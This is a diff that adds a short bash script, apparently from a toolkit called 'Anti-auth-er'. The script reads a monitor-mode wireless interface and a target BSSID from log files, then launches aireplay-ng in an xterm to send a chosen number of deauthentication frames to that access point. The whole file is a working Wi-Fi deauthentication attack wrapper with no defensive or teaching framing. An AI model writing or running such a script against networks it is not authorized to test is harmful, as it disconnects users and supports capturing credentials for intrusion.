@@ -1,0 +1,12 @@
+#!/usr/bin/env bash
+
+#aireplay
+#parameters - 1. home dir 2. no. of deauths
+
+read junk < $1/claps/Anti-auth-er/logs/interface-mon.log
+interface_mon=`echo "$junk" | head -n1 | sed -e 's/\s.*$//'`
+
+read bssid < $1/claps/Anti-auth-er/scan/bssid
+death=0
+((death=death+$2))
+xterm -T "Anti-auth-er" -geometry "124x26+2000+5" -e "aireplay-ng -0 $death -a $bssid $interface_mon"
